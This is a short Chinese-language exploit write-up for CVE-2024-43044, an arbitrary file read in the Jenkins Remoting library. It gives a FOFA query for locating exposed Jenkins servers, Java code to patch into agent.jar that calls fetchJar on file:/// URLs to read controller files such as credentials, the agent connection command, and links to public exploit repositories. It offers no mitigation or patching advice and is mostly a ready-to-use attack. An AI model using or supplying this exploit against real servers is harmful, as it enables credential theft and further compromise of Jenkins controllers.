# Jenkins-Remoting任意文件读取漏洞(CVE-2024-43044)

Jenkins是一个开源的、提供持续集成服务（CI）的软件平台。Jenkins 使用 Remoting 库（通常为agent.jar或remoting.jar）实现控制器与代理之间的通信，该库允许代理从控制器加载类和类加载器资源，以便从控制器发送的 Java 对象（构建步骤等）可以在代理上执行。

**Jenkins Remoting任意文件读取漏洞(CVE-2024-43044)**，由于Remoting库ClassLoaderProxy#fetchJar方法没有限制代理请求从控制器文件系统读取的路径，可能导致**拥有Agent/Connect权限**的攻击者从Jenkins控制器文件系统读取任意文件（如凭证、配置文件等敏感信息）并进一步利用导致远程代码执行。

## fofa

```javascript
app="Jenkins"
```

## poc

通过`http://ip:port/jnlpJars/agent.jar`下载jar包

修改`\hudson\remoting\RemoteClassLoader.class`对应代码

![image-20240905091939652](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050919209.png)

```java

try {  
    Scanner scanner = new Scanner(System.in);  
    System.out.print("输入读取文件path:");  
    String inputText = scanner.nextLine();  
    System.out.println("尝试读取:" + inputText);  
    URL jarFileUrl = new URL("file:///" + inputText);  
    byte[] fileContent = this.proxy.fetchJar(jarFileUrl);  
    String contentAsString = new String(fileContent, StandardCharsets.UTF_8);  
    System.out.println("文件内容:\n" + contentAsString);  
} catch (Exception var10) {  
    System.out.println("WRONG:" + var10);  
}
```

需提前获悉node的密钥和名称

![image-20240905092102978](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050921039.png)

```java
java -jar agent.jar -url http://ip:port/ -secret <xxx> -name <xxx>
```

![image-20240905092434004](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409050924072.png)

### exp

```
https://github.com/convisolabs/CVE-2024-43044-jenkins
```



## 漏洞来源

- https://forum.butian.net/article/559
- https://github.com/v9d0g/CVE-2024-43044-POC
- https://github.com/convisolabs/CVE-2024-43044-jenkins